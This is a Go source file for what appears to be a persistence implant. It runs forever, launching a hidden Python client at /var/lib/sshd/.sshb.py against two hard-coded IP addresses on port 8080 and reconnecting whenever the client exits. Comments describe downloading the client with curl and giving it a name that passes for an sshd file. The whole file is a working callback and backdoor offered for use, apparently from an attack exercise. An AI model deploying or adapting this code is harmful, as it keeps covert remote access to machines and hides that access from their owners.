package main

import (
	"os/exec"
	"time"
)

func shell(ip string, port string) {
	//
	//mkdir /var/lib/sshd/totallysshd.py
	//curl client.py from github and drop it at /var/lib/sshd/totallysshd.py

	cmd := exec.Command("/usr/bin/python3", "/var/lib/sshd/.sshb.py", ip, port) //execute the command
	err := cmd.Run()                                                            //define err by running cmd
	if err != nil {                                                             //if there is an error, re-loop
		shell(ip, port)
	}
}

func main() {
	ips := []string{"127.0.0.1", "129.21.49.57"}
	for {
		for i, s := range ips { //iterate over the IP addresses
			go shell(s, "8080")     //run a client as a thread
			time.Sleep(time.Second) //sleep for a second before starting the other threads
			_ = i                   //not using i
		}
		time.Sleep(10 * time.Second) //sleep for 5 minutes then try to reconnect again
	}
}
